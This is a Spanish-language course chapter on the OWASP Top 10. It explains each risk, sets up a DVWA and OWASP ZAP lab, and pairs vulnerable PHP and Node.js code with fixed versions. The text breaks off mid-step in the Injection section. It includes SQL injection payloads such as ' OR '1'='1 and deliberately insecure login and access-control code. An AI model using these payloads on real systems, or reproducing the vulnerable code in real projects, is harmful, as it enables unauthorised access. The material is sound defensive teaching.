| **Inicio**         | **atr√°s 7**                                                | **Siguiente 9**                                    |
| ------------------ | ---------------------------------------------------------- | -------------------------------------------------- |
| [üè†](../README.md) | [‚è™](./7_7_Seguridad_Informatica_para_Equipos_Tecnicos.md) | [‚è©](./7_9_Curso_de_Introduccion_al_Pentesting.md) |

---

## **√çndice**

| Temario                                                                                            |
| -------------------------------------------------------------------------------------------------- |
| [760. Qu√© es OWASP Top 10](#760-qu√©-es-owasp-top-10)                                               |
| [761. C√≥mo utilizar OWASP Top 10](#761-c√≥mo-utilizar-owasp-top-10)                                 |
| [762. Prepara tu laboratorio de pruebas](#762-prepara-tu-laboratorio-de-pruebas)                   |
| [763. Broken Access Control](#763-broken-access-control)                                           |
| [764. Cryptographic Failures](#764-cryptographic-failures)                                         |
| [765. Injection](#765-injection)                                                                   |
| [766. Insecure Design](#766-insecure-design)                                                       |
| [767. Security Misconfiguration](#767-security-misconfiguration)                                   |
| [768. Vulnerable and Outdated Components](#768-vulnerable-and-outdated-components)                 |
| [769. Identification and Authentication Failures](#769-identification-and-authentication-failures) |
| [770. Software and Data Integrity Failures](#770-software-and-data-integrity-failures)             |
| [771. Security Logging and Monitoring Failures](#771-security-logging-and-monitoring-failures)     |
| [772. Server-Side Request Forgery](#772-server-side-request-forgery)                               |

# **OWASP Top 10: Riesgos en Aplicaciones**

## **760. Qu√© es OWASP Top 10**

### üîê ¬øQu√© es OWASP Top 10?

OWASP Top 10 es una lista de las **10 vulnerabilidades de seguridad m√°s cr√≠ticas** en aplicaciones web, publicada por el proyecto **OWASP** (Open Worldwide Application Security Project).
Es una **referencia est√°ndar en ciberseguridad** usada por desarrolladores, testers y empresas para identificar, entender y mitigar las principales amenazas de seguridad en el desarrollo web.

---

#### üéØ ¬øPara qu√© sirve OWASP Top 10?

- **Concienciar** a los desarrolladores sobre errores comunes de seguridad.
- **Auditar** aplicaciones web.
- **Mejorar** la seguridad de tus proyectos.
- **Cumplir** est√°ndares legales y normativos (por ejemplo, PCI-DSS).

---

### üß® OWASP Top 10 - Lista de Vulnerabilidades (2021)

1. **Broken Access Control**

   Control de acceso incorrecto: Usuarios acceden a datos o funciones que no deber√≠an.
   ‚ùå _Ejemplo:_ Un usuario com√∫n accede a `/admin/panel`.

2. **Cryptographic Failures**

   Fallos en cifrado o manejo de datos sensibles.
   ‚ùå _Ejemplo:_ Contrase√±as almacenadas sin hash.

3. **Injection**

   Inyecci√≥n de comandos SQL, NoSQL, LDAP, etc.
   ‚ùå _Ejemplo:_ `SELECT * FROM users WHERE name = '$nombre'`

4. **Insecure Design**

   Dise√±o de la aplicaci√≥n permite ataques por falta de validaciones o seguridad.
   ‚ùå _Ejemplo:_ Un sistema de pagos que no verifica saldo antes de transferir.

5. **Security Misconfiguration**

   Configuraciones inseguras en servidores o apps.
   ‚ùå _Ejemplo:_ Mostrar errores detallados de servidor en producci√≥n.

6. **Vulnerable and Outdated Components**

   Uso de librer√≠as o frameworks antiguos y con fallos conocidos.
   ‚ùå _Ejemplo:_ Usar jQuery 1.x con vulnerabilidades conocidas.

7. **Identification and Authentication Failures**

   Fallas en autenticaci√≥n (login, tokens, etc).
   ‚ùå _Ejemplo:_ Login sin protecci√≥n contra ataques de fuerza bruta.

8. **Software and Data Integrity Failures**

   Procesos inseguros para actualizaciones, plugins, etc.
   ‚ùå _Ejemplo:_ Cargar scripts externos sin verificar integridad.

9. **Security Logging and Monitoring Failures**

   No registrar ni monitorear actividades sospechosas.
   ‚ùå _Ejemplo:_ No registrar intentos de acceso fallidos.

10. **Server-Side Request Forgery (SSRF)**

    El servidor es enga√±ado para hacer solicitudes a recursos internos.
    ‚ùå _Ejemplo:_ El usuario controla una URL y fuerza al servidor a acceder a `http://localhost/admin`.

---

### üíª ¬øC√≥mo "instalar" o usar OWASP Top 10?

> _OWASP Top 10 no es un software que se instala, sino una gu√≠a que debes aplicar en el desarrollo y an√°lisis de seguridad de tus aplicaciones._

Pero s√≠ puedes usar **herramientas basadas en OWASP** para encontrar estas vulnerabilidades autom√°ticamente.

#### üõ†Ô∏è Herramientas √∫tiles basadas en OWASP

1. **OWASP ZAP (Zed Attack Proxy)**

   - Herramienta gratuita para escanear apps web.
   - Detecta vulnerabilidades del OWASP Top 10.
   - üîó [https://www.zaproxy.org/](https://www.zaproxy.org/)

2. **Burp Suite (versi√≥n Community y Pro)**

   - Muy usada en pentesting.
   - Intercepta peticiones y busca fallos OWASP.

3. **SonarQube con plugins de seguridad**

   - Revisa c√≥digo fuente.

---

### üß™ Instalaci√≥n r√°pida de OWASP ZAP (como ejemplo)

#### üîπ En Windows/macOS/Linux

1. Ve a: [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/)
2. Descarga e instala.
3. Ejecuta ZAP.
4. Introduce la URL de tu sitio web.
5. Haz un escaneo autom√°tico.
6. Revisa los resultados en base al Top 10.

---

### ‚úÖ Ejemplo completo (f√°cil de entender)

Imaginemos una aplicaci√≥n sencilla en PHP:

```php
// login.php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$conn = new mysqli("localhost", "root", "", "usuarios");
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($sql);
```

---

#### ‚ùå Vulnerabilidades OWASP en este c√≥digo

1. **Injection (#3):**
   El SQL incluye variables directamente (`'$username'`). Si alguien env√≠a:

   ```sql
   ' OR 1=1 --
   ```

   El acceso ser√° v√°lido sin credenciales.

2. **Cryptographic Failures (#2):**
   Contrase√±a guardada en texto plano.

3. **Security Misconfiguration (#5):**
   El c√≥digo no usa HTTPS, ni tiene logs ni validaciones.

---

#### ‚úÖ Versi√≥n segura basada en OWASP Top 10:

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$conn = new mysqli("localhost", "root", "", "usuarios");

// Usar prepared statements para evitar SQL Injection
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

$user = $result->fetch_assoc();

// Verificar el hash de la contrase√±a
if ($user && password_verify($password, $user['password'])) {
    echo "Login correcto";
} else {
    echo "Credenciales inv√°lidas";
}
```

Y en el registro de usuarios, deber√≠as usar:

```php
$hash = password_hash($password, PASSWORD_BCRYPT);
```

---

### üìö Recursos para seguir aprendiendo

- [OWASP Top 10 (oficial en espa√±ol)](https://owasp.org/www-project-top-ten/)
- [Gu√≠a OWASP para desarrolladores](https://cheatsheetseries.owasp.org/)
- [ZAP: Gu√≠a de inicio r√°pido](https://owasp.org/www-project-zap/)

---

[üîº](#√≠ndice)

---

## **761. C√≥mo utilizar OWASP Top 10**

### üîß ¬øC√≥mo utilizar OWASP Top 10?

> Usar OWASP Top 10 significa **desarrollar, analizar y corregir** aplicaciones web teniendo en cuenta las 10 vulnerabilidades m√°s cr√≠ticas de seguridad.

#### Existen dos maneras de utilizarlo:

---

#### ‚úÖ 1. **Aplicarlo en tu c√≥digo como buenas pr√°cticas**

Esto significa escribir tu c√≥digo de forma que evites caer en las vulnerabilidades que OWASP Top 10 identifica.

üìå Ejemplo:

- En lugar de:

  ```php
  $sql = "SELECT * FROM users WHERE email = '".$_POST['email']."'";
  ```

- Usas:

  ```php
  $stmt = $conn->prepare("SELECT * FROM users WHERE email = ?");
  $stmt->bind_param("s", $_POST['email']);
  ```

Con esto **evitas SQL Injection**, que es una de las vulnerabilidades OWASP (#3).

---

#### üõ†Ô∏è 2. **Usar herramientas autom√°ticas de an√°lisis**

OWASP y la comunidad han creado herramientas para **escanear autom√°ticamente tu aplicaci√≥n web** y encontrar vulnerabilidades del Top 10.

---

### üöÄ ¬øC√≥mo se instala y se usa una herramienta basada en OWASP Top 10?

Vamos a usar **OWASP ZAP (Zed Attack Proxy)**, la herramienta m√°s conocida de OWASP.

---

### üêç Ejemplo completo usando **OWASP ZAP**

#### üõ† Paso 1: Instalar OWASP ZAP

##### üì¶ Opci√≥n 1: Descargar instalador

1. Ir a üëâ [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/)
2. Descargar e instalar para tu sistema operativo (Windows, macOS, Linux).
3. Abrir ZAP.

##### üì¶ Opci√≥n 2: Usar v√≠a Docker

```bash
docker pull owasp/zap2docker-stable
docker run -u zap -p 8080:8080 -i owasp/zap2docker-stable zap.sh
```

---

#### üõ† Paso 2: Escanear tu sitio web (modo autom√°tico)

1. Entra a ZAP.
2. En el men√∫, elige **Quick Start > Automated Scan**.
3. Ingresa la URL de tu sitio web (por ejemplo, `http://localhost:3000`).
4. Espera mientras ZAP escanea tu sitio.
5. Cuando termine, ZAP te mostrar√° un reporte con vulnerabilidades encontradas, **clasificadas seg√∫n el OWASP Top 10**.

---

#### üìã Ejemplo del reporte:

| Vulnerabilidad         | Severidad | Descripci√≥n                                |
| ---------------------- | --------- | ------------------------------------------ |
| SQL Injection          | Alta      | Entrada no sanitizada en el par√°metro `id` |
| Broken Access Control  | Alta      | Ruta `/admin` accesible sin autenticaci√≥n  |
| X-Content-Type-Options | Baja      | Falta cabecera `X-Content-Type-Options`    |

---

### üìå Aplicaci√≥n pr√°ctica con ejemplo real

Imagina que est√°s creando un **formulario de login en Node.js con Express**:

```js
// Versi√≥n insegura (vulnerable)
app.post("/login", async (req, res) => {
  const { email, password } = req.body;
  const user = await db.query(
    `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`
  );
  if (user.length > 0) {
    res.send("Bienvenido");
  } else {
    res.send("Credenciales incorrectas");
  }
});
```

---

#### ‚ùå Vulnerabilidades OWASP presentes:

| Vulnerabilidad OWASP Top 10    | Explicaci√≥n                                                              |
| ------------------------------ | ------------------------------------------------------------------------ |
| Injection (#3)                 | El c√≥digo inserta directamente los datos del usuario en la consulta SQL. |
| Cryptographic Failures (#2)    | Las contrase√±as no est√°n cifradas, se comparan en texto plano.           |
| Security Misconfiguration (#5) | No hay rate limiting, ni protecci√≥n contra m√∫ltiples intentos.           |

---

#### ‚úÖ Versi√≥n segura (aplicando OWASP Top 10)

```js
const bcrypt = require("bcrypt");

app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  // Usar par√°metros seguros en SQL
  const result = await db.query("SELECT * FROM users WHERE email = ?", [email]);
  const user = result[0];

  if (user && (await bcrypt.compare(password, user.password_hash))) {
    res.send("Bienvenido");
  } else {
    res.status(401).send("Credenciales inv√°lidas");
  }
});
```

Adem√°s:

- Las contrase√±as se deben guardar as√≠:

```js
const password_hash = await bcrypt.hash(password, 10);
await db.query("INSERT INTO users (email, password_hash) VALUES (?, ?)", [
  email,
  password_hash,
]);
```

---

### üß© ¬øC√≥mo OWASP Top 10 mejora esto?

| Vulnerabilidad            | Soluci√≥n aplicada                           |
| ------------------------- | ------------------------------------------- |
| SQL Injection             | Se usa consulta parametrizada (`?`)         |
| Cryptographic Failures    | Se usa `bcrypt` para hashing de contrase√±as |
| Security Misconfiguration | Puedes agregar rate limiting, logs, HTTPS   |

---

### üìö Recursos extra

- [OWASP ZAP User Guide](https://www.zaproxy.org/docs/)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [OWASP Top 10 2021 - oficial](https://owasp.org/Top10/)

---

### ‚úÖ Resumen final

| Acci√≥n                            | ¬øQu√© haces?                                                     |
| --------------------------------- | --------------------------------------------------------------- |
| üìñ Leer OWASP Top 10              | Entiendes las 10 amenazas principales.                          |
| üßë‚Äçüíª Codificar con buenas pr√°cticas | Evitas vulnerabilidades desde el c√≥digo.                        |
| üß™ Usar herramientas como ZAP     | Escaneas tus aplicaciones y detectas problemas autom√°ticamente. |
| üîÅ Corregir vulnerabilidades      | Ajustas tu app seg√∫n las recomendaciones del OWASP Top 10.      |

---

[üîº](#√≠ndice)

---

## **762. Prepara tu laboratorio de pruebas**

### üß™ ¬øQu√© es un laboratorio de pruebas?

Un laboratorio de pruebas de seguridad es un **entorno local o virtual** donde puedes practicar ataques y defensas sin poner en riesgo sistemas reales.
Es como una zona segura donde puedes "romper cosas" legalmente y aprender.

---

### üéØ ¬øPara qu√© sirve?

- Practicar **vulnerabilidades OWASP Top 10**.
- Probar herramientas como **OWASP ZAP**, **Burp Suite**, etc.
- Simular ataques: inyecci√≥n SQL, XSS, CSRF, etc.
- Aprender **ciberseguridad ofensiva y defensiva**.

---

### üß± Componentes del laboratorio

1. **M√°quina virtual o contenedor** (opcional pero recomendado)
2. Aplicaci√≥n vulnerable para practicar
3. Herramientas de an√°lisis y ataque (ZAP, Burp, navegador)
4. Navegador con plugins √∫tiles (como HackBar)

---

#### üîß PASO 1: Instalar una app vulnerable

Vamos a usar **DVWA (Damn Vulnerable Web App)** ‚Äî una app especialmente dise√±ada para practicar ataques web.

---

#### üê≥ OPCI√ìN A: Instalar DVWA usando Docker (m√°s f√°cil y r√°pido)

1. Aseg√∫rate de tener **Docker** instalado. Si no:

   - üëâ [https://www.docker.com/products/docker-desktop/](https://www.docker.com/products/docker-desktop/)

2. Ejecuta estos comandos en terminal/powershell:

```bash
# Clonar repositorio DVWA
git clone https://github.com/digininja/DVWA.git
cd DVWA

# Crear archivo de configuraci√≥n (copiar y renombrar)
cp config/config.inc.php.dist config/config.inc.php

# Ejecutar con Docker Compose
docker-compose up -d
```

3. Abre tu navegador y entra a:

```
http://localhost:80
```

Usuario por defecto: `admin`
Contrase√±a: `password`

> Si ves errores, abre `http://localhost/setup.php` y haz clic en "Create / Reset Database".

---

#### üß∞ OPCI√ìN B: Instalar DVWA en XAMPP (Windows)

1. Descarga e instala [XAMPP](https://www.apachefriends.org/es/index.html)

2. Descarga DVWA desde:
   üëâ [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

3. Copia la carpeta DVWA a:

```
C:\xampp\htdocs\dvwa
```

4. Edita el archivo `config/config.inc.php.dist`:

   - Cambia el nombre a `config.inc.php`
   - Aseg√∫rate que estas l√≠neas est√°n as√≠:

```php
$_DVWA[ 'db_user' ] = 'root';
$_DVWA[ 'db_password' ] = '';
```

5. Abre XAMPP, activa **Apache** y **MySQL**

6. En el navegador, abre:

```
http://localhost/dvwa/setup.php
```

Haz clic en **Create / Reset Database**

7. Luego ve a:

```
http://localhost/dvwa
```

Usuario: `admin`
Contrase√±a: `password`

---

### üõ† PASO 2: Instalar herramientas de an√°lisis

#### 1. **OWASP ZAP**

- Descargar desde üëâ [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/)
- Inst√°lalo y ejec√∫talo

#### 2. **Burp Suite (opcional)**

- Descargar versi√≥n gratuita desde üëâ [https://portswigger.net/burp](https://portswigger.net/burp)

#### 3. **HackBar Plugin para Firefox/Chrome**

- Permite modificar f√°cilmente par√°metros en URLs
- üëâ Buscar ‚ÄúHackBar‚Äù en la tienda de extensiones de tu navegador

---

### üß™ PASO 3: Realiza tu primera prueba

#### üîç Ejemplo: prueba de SQL Injection en DVWA

1. Abre DVWA en tu navegador
   üëâ `http://localhost/dvwa`

2. Inicia sesi√≥n (`admin` / `password`)

3. Ve a **"SQL Injection"** (men√∫ izquierdo)

4. En el campo de ID, escribe:

```sql
1' OR '1'='1
```

5. Pulsa "Submit"
   Deber√≠as ver una **lista completa de usuarios**, sin autenticar.

üéØ ¬°Felicidades! Acabas de ejecutar tu primer ataque de inyecci√≥n SQL en un entorno seguro.

---

### üìÅ Estructura recomendada del laboratorio

| Elemento                  | Herramienta / app recomendada                      |
| ------------------------- | -------------------------------------------------- |
| Aplicaci√≥n vulnerable     | DVWA, WebGoat, Juice Shop                          |
| An√°lisis autom√°tico       | OWASP ZAP, Burp Suite                              |
| Navegador con plugins     | Firefox/Chrome + HackBar                           |
| Sistema de virtualizaci√≥n | Docker o VirtualBox (opcional para aislar entorno) |

---

### üì¶ Extra: Otras apps vulnerables

| App Vulnerable | Descripci√≥n                      | Instalaci√≥n f√°cil con |
| -------------- | -------------------------------- | --------------------- |
| **DVWA**       | Inyecciones, XSS, CSRF, etc.     | Docker, XAMPP         |
| **WebGoat**    | App educativa oficial de OWASP   | Docker, JAR           |
| **Juice Shop** | App moderna con m√∫ltiples fallos | Docker, Node.js       |
| **bWAPP**      | Cientos de fallos configurables  | Docker, PHP           |

---

### ‚úÖ Resumen: tu laboratorio de pruebas

| Paso | Acci√≥n                                                        |
| ---- | ------------------------------------------------------------- |
| 1    | Instala DVWA (Docker o XAMPP)                                 |
| 2    | Abre en navegador y configura la base de datos                |
| 3    | Instala herramientas como ZAP y plugins                       |
| 4    | Realiza pruebas (SQLi, XSS, CSRF, etc.)                       |
| 5    | Analiza resultados y corrige errores con base en OWASP Top 10 |

---

[üîº](#√≠ndice)

---

## **763. Broken Access Control**

### üîê ¬øQu√© es Broken Access Control?

**Broken Access Control** (Control de acceso roto) es una de las vulnerabilidades m√°s graves seg√∫n el **OWASP Top 10**.
Ocurre cuando una aplicaci√≥n **permite que un usuario acceda a recursos o acciones que no deber√≠a poder usar**.

---

### üö® ¬øPor qu√© es peligroso?

Porque permite que:

- Un **usuario normal acceda a funciones de administrador**
- Un **usuario vea o modifique datos de otro usuario**
- Se puedan **cambiar roles, eliminar recursos o extraer informaci√≥n confidencial**

---

### üéØ Ejemplos simples de Broken Access Control

#### Ejemplo 1: Ruta de administrador sin protecci√≥n

```url
https://miapp.com/admin/panel
```

Si un usuario normal puede abrir esa URL sin restricciones, hay un **fallo de control de acceso**.

---

#### Ejemplo 2: Cambiar IDs en la URL

```url
https://miapp.com/usuarios/editar?id=5
```

Un atacante cambia la URL a:

```url
https://miapp.com/usuarios/editar?id=1
```

Y edita datos de otro usuario. Esto se llama **Insecure Direct Object Reference (IDOR)**, una forma com√∫n de Broken Access Control.

---

### üß± C√≥mo instalar un entorno para practicar Broken Access Control

#### ‚úÖ Usaremos: **DVWA** (Damn Vulnerable Web App)

---

### üîß PASO 1: Instalar DVWA usando Docker

#### üê≥ Requisitos:

- Tener Docker instalado ‚Üí [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop)

#### üì¶ Comandos:

```bash
git clone https://github.com/digininja/DVWA.git
cd DVWA
cp config/config.inc.php.dist config/config.inc.php
docker-compose up -d
```

#### üñ• Abre en tu navegador:

```
http://localhost
```

Usuario: `admin`
Contrase√±a: `password`

Haz clic en **setup.php ‚Üí Create / Reset Database**

---

### üîç PASO 2: Prueba real de Broken Access Control en DVWA

#### 1. Inicia sesi√≥n como usuario normal (`admin` / `password`)

#### 2. Ve a la opci√≥n ‚Äú**DVWA Security**‚Äù y pon el nivel en **Low**

#### 3. En el men√∫, entra a "**File Upload**"

#### 4. Sube cualquier archivo `.php` o `.txt`

#### 5. Luego visita la URL:

```url
http://localhost/hackable/uploads/archivo.php
```

‚úîÔ∏è **Funciona sin verificaci√≥n de permisos.**

Este es un ejemplo cl√°sico de **Broken Access Control**, ya que **permite que cualquier usuario suba y acceda a archivos arbitrarios**, sin ning√∫n tipo de restricci√≥n.

---

### üßë‚Äçüíª Ejemplo completo: C√≥digo vulnerable vs c√≥digo seguro

#### üî¥ C√≥digo INSEGURO (Broken Access Control)

Sup√≥n que tienes esta ruta en Node.js:

```js
// Ruta insegura
app.get("/admin", (req, res) => {
  res.send("Bienvenido al panel de administrador");
});
```

‚úÖ ¬øEl problema?

**No verifica si el usuario es administrador.**

Cualquiera que entre a `http://localhost:3000/admin` puede ver ese contenido.

---

### ‚úÖ C√≥digo SEGURO (Control de acceso implementado)

```js
function esAdmin(req, res, next) {
  if (req.user && req.user.rol === "admin") {
    next(); // contin√∫a
  } else {
    res.status(403).send("Acceso denegado");
  }
}

// Ruta protegida
app.get("/admin", esAdmin, (req, res) => {
  res.send("Bienvenido al panel de administrador");
});
```

üõ°Ô∏è Ahora la ruta `/admin` solo estar√° disponible para usuarios con el rol `"admin"`.

---

### üîÑ Ejemplo de IDOR (acceso por ID inseguro)

#### üî¥ Inseguro:

```js
app.get("/perfil/:id", async (req, res) => {
  const user = await db.getUserById(req.params.id);
  res.json(user);
});
```

Aqu√≠ un atacante puede ver perfiles de otros usuarios simplemente cambiando la ID en la URL.

---

#### ‚úÖ Seguro (control de ID):

```js
app.get("/perfil/:id", async (req, res) => {
  if (req.user.id !== req.params.id && req.user.rol !== "admin") {
    return res.status(403).send("No autorizado");
  }

  const user = await db.getUserById(req.params.id);
  res.json(user);
});
```

---

### ‚úÖ C√≥mo detectar Broken Access Control con herramientas

#### üß™ Usando OWASP ZAP

1. Abre OWASP ZAP
2. Escanea tu sitio (`http://localhost`)
3. Mira si hay rutas accesibles sin autenticaci√≥n o control de roles
4. Analiza alertas tipo:

   - **"Access to admin area without login"**
   - **"IDOR detected via parameter"**

---

### üß† Buenas pr√°cticas para evitar Broken Access Control

| Recomendaci√≥n                             | ¬øPor qu√©?                                                   |
| ----------------------------------------- | ----------------------------------------------------------- |
| ‚úîÔ∏è Verifica roles y permisos en cada ruta | Para asegurarte de que cada acci√≥n est√© autorizada          |
| ‚úîÔ∏è Nunca conf√≠es en IDs en URL            | Pueden ser modificadas f√°cilmente por atacantes             |
| ‚úîÔ∏è Usa control de sesi√≥n y autenticaci√≥n  | Para saber qui√©n es el usuario y limitar acceso             |
| ‚úîÔ∏è Oculta rutas administrativas           | No hagas visible `/admin`, usa tokens o doble autenticaci√≥n |

---

### üß© RESUMEN FINAL

| Punto            | Explicaci√≥n                                                                 |
| ---------------- | --------------------------------------------------------------------------- |
| üìå ¬øQu√© es?      | Acceso no autorizado a recursos, funciones o datos                          |
| ‚ö†Ô∏è Ejemplos      | Rutas sin protecci√≥n, edici√≥n de datos ajenos, subida de archivos inseguros |
| üß™ C√≥mo probarlo | Usando DVWA, simulando usuarios y rutas                                     |
| üîê C√≥mo evitarlo | Validar roles, autenticar usuarios, proteger rutas                          |
| üõ† Herramientas   | OWASP ZAP, Burp Suite, DVWA para pr√°cticas                                  |

---

[üîº](#√≠ndice)

---

## **764. Cryptographic Failures**

![Cryptographic Failures](../img/7_Ciberseguridad_Profesional/Cryptographic_Failures.png "Cryptographic Failures")

### üîê ¬øQu√© es _Cryptographic Failures_?

**Cryptographic Failures** (fallos criptogr√°ficos) es la categor√≠a #2 del **OWASP Top 10** (2021) y antes se conoc√≠a como "**Sensitive Data Exposure**".

Esta vulnerabilidad ocurre cuando:

- La informaci√≥n **sensible** (como contrase√±as, tokens, datos personales o financieros) **no est√° protegida adecuadamente** mediante criptograf√≠a.
- Se usa **cifrado d√©bil**, incorrecto o **sin cifrado**.
- La informaci√≥n **viaja sin HTTPS**, o se almacenan contrase√±as sin `hash`.

---

### üéØ ¬øPor qu√© es grave?

Porque permite que un atacante:

- Intercepte datos (ej. con un ataque _Man-in-the-Middle_)
- Lea contrase√±as robadas sin dificultad
- Acceda a informaci√≥n sensible desde una base de datos hackeada

---

### üò± Ejemplos reales

| Vulnerabilidad                 | Ejemplo simple                                            |
| ------------------------------ | --------------------------------------------------------- |
| Contrase√±a sin `hash`          | Guardar: `123456` en texto plano                          |
| Cifrado d√©bil                  | Usar MD5 o SHA1, que son _rotos_ y f√°ciles de romper      |
| Sin HTTPS                      | Formulario de login que env√≠a datos por HTTP              |
| Sin validaci√≥n de certificados | Cliente que acepta cualquier certificado SSL              |
| Token expuesto                 | Guardar tokens de sesi√≥n sin cifrar en cookies o archivos |

---

### ‚ö†Ô∏è EJEMPLO DE C√ìDIGO INSEGURO

#### ‚ùå Versi√≥n insegura en PHP (sin hashing de contrase√±as)

```php
// register.php
$password = $_POST['password'];
// Se guarda la contrase√±a tal cual en la base de datos (¬°muy mal!)
$sql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
```

Si alguien roba la base de datos, ve esto:

```
username: juan
password: 123456
```

üìõ ¬°Grave riesgo! No hay cifrado, hash, ni protecci√≥n.

---

### ‚úÖ C√≥mo evitar Cryptographic Failures

| Qu√© hacer                            | C√≥mo hacerlo                            |
| ------------------------------------ | --------------------------------------- |
| ‚úÖ Usar `hash` para contrase√±as      | Con `bcrypt`, `Argon2`, `PBKDF2`        |
| ‚úÖ Usar HTTPS                        | En toda la app (no solo login)          |
| ‚úÖ No usar MD5 ni SHA1               | Son inseguros. Usa algoritmos modernos. |
| ‚úÖ Cifrar datos sensibles            | Con claves seguras y librer√≠as robustas |
| ‚úÖ No guardar claves duras en c√≥digo | Usa variables de entorno o `vaults`     |

---

### üõ† C√≥mo instalar un entorno de pruebas para Cryptographic Failures

#### ‚úÖ Usaremos: **DVWA (Damn Vulnerable Web App)**

DVWA incluye vulnerabilidades como contrase√±as sin hash, formularios sin HTTPS, etc.

---

#### üê≥ PASO 1: Instalar DVWA con Docker

#### Requisitos:

- Docker instalado ‚Üí [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop)

#### Comandos para instalar:

```bash
git clone https://github.com/digininja/DVWA.git
cd DVWA
cp config/config.inc.php.dist config/config.inc.php
docker-compose up -d
```

Abre en el navegador:

```
http://localhost
```

Usuario: `admin`
Contrase√±a: `password`

Haz clic en `setup.php ‚Üí Create / Reset Database`

---

#### üß™ PASO 2: Prueba de Cryptographic Failure en DVWA

1. Inicia sesi√≥n
2. Ve a la opci√≥n "**DVWA Security**" y pon el nivel en **Low**
3. En el men√∫, entra a "**Brute Force**"
4. Abre el c√≥digo fuente (desde GitHub o inspeccionando el navegador)

Notar√°s que DVWA **almacena contrase√±as en texto plano**, y no tiene HTTPS.

Esto simula un **Cryptographic Failure** real.

---

### ‚úÖ EJEMPLO COMPLETO: Corregir Cryptographic Failure

#### üî¥ C√ìDIGO INSEGURO (Node.js con contrase√±as en texto plano)

```js
app.post("/register", async (req, res) => {
  const { username, password } = req.body;
  await db.query("INSERT INTO users (username, password) VALUES (?, ?)", [
    username,
    password,
  ]);
  res.send("Registrado");
});
```

---

#### ‚úÖ C√ìDIGO SEGURO (con `bcrypt`)

```js
const bcrypt = require("bcrypt");

app.post("/register", async (req, res) => {
  const { username, password } = req.body;

  // Encriptar la contrase√±a antes de guardarla
  const hashedPassword = await bcrypt.hash(password, 10);

  await db.query("INSERT INTO users (username, password) VALUES (?, ?)", [
    username,
    hashedPassword,
  ]);
  res.send("Registrado con seguridad");
});
```

Y para verificarla en login:

```js
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  const result = await db.query("SELECT * FROM users WHERE username = ?", [
    username,
  ]);
  const user = result[0];

  if (user && (await bcrypt.compare(password, user.password))) {
    res.send("Login correcto");
  } else {
    res.status(401).send("Credenciales inv√°lidas");
  }
});
```

---

### üîê BONUS: C√≥mo cifrar datos sensibles (ej. tarjetas)

Usa bibliotecas como `crypto` en Node.js o `OpenSSL` en PHP.

#### Ejemplo con `crypto` en Node.js:

```js
const crypto = require("crypto");
const secret = process.env.SECRET_KEY; // NO pongas esto en el c√≥digo directamente

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", Buffer.from(secret), iv);
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString("hex") + ":" + encrypted.toString("hex");
}
```

---

### ‚úÖ Resumen final

| Aspecto             | Explicaci√≥n                                              |
| ------------------- | -------------------------------------------------------- |
| ¬øQu√© es?            | Fallos en cifrado, hashing, almacenamiento o transmisi√≥n |
| Ejemplos comunes    | Contrase√±as sin hash, sin HTTPS, usar MD5/SHA1           |
| C√≥mo practicar      | Instalar DVWA y analizar formularios y login             |
| C√≥mo protegerte     | Usar bcrypt, HTTPS, cifrado moderno, variables seguras   |
| Herramientas √∫tiles | ZAP, Wireshark, DVWA, HTTPS scanner                      |

---

[üîº](#√≠ndice)

---

## **765. Injection**

### üß® ¬øQu√© es Injection?

**Injection** (inyecci√≥n) es una de las **vulnerabilidades m√°s comunes y peligrosas** seg√∫n el OWASP Top 10 (es el n√∫mero 3).

Esta vulnerabilidad ocurre cuando **datos del usuario son enviados directamente a un int√©rprete** (como SQL, comandos del sistema, NoSQL, LDAP, etc.) sin ser validados, filtrados o escapados.
Esto permite a un atacante **inyectar c√≥digo malicioso** y **alterar el comportamiento de la aplicaci√≥n**.

---

### üéØ Tipos comunes de Inyecci√≥n

| Tipo de inyecci√≥n     | ¬øD√≥nde ocurre?             | Ejemplo                                |
| --------------------- | -------------------------- | -------------------------------------- |
| **SQL Injection**     | En bases de datos          | `SELECT * FROM users WHERE id = '$id'` |
| **Command Injection** | En comandos del sistema    | `exec("ping " + $host)`                |
| **NoSQL Injection**   | En bases NoSQL (MongoDB)   | `db.users.find({ username: input })`   |
| **LDAP Injection**    | En b√∫squedas de directorio | `(&(user=$input))`                     |

---

### üò± Ejemplo real de SQL Injection

#### Sup√≥n este c√≥digo PHP:

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = '$id'";
```

Si un atacante pone esto en la URL:

```
?id=1' OR '1'='1
```

El SQL resultante ser√°:

```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
```

‚ö†Ô∏è Eso **siempre ser√° verdadero**, y devolver√° **todos los usuarios** sin autorizaci√≥n.

---

### üß™ ¬øC√≥mo instalar un entorno de pruebas para Injection?

#### ‚úÖ Opci√≥n recomendada: **DVWA (Damn Vulnerable Web App)**

DVWA es una aplicaci√≥n web insegura que incluye una secci√≥n espec√≠fica para practicar **SQL Injection y otras inyecciones**.

---

### üê≥ PASO 1: Instalar DVWA usando Docker

#### Requisitos:

- Tener Docker instalado:
  üëâ [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop)

#### Comandos:

```bash
git clone https://github.com/digininja/DVWA.git
cd DVWA
cp config/config.inc.php.dist config/config.inc.php
docker-compose up -d
```

üìé Luego, abre tu navegador y entra a:

```
http://localhost
```

Usuario: `admin`
Contrase√±a: `password`

Haz clic en `setup.php ‚Üí Create / Reset Database`

---

### üîç PASO 2: Probar una inyecci√≥n en DVWA

1. Inicia sesi√≥n en DVWA
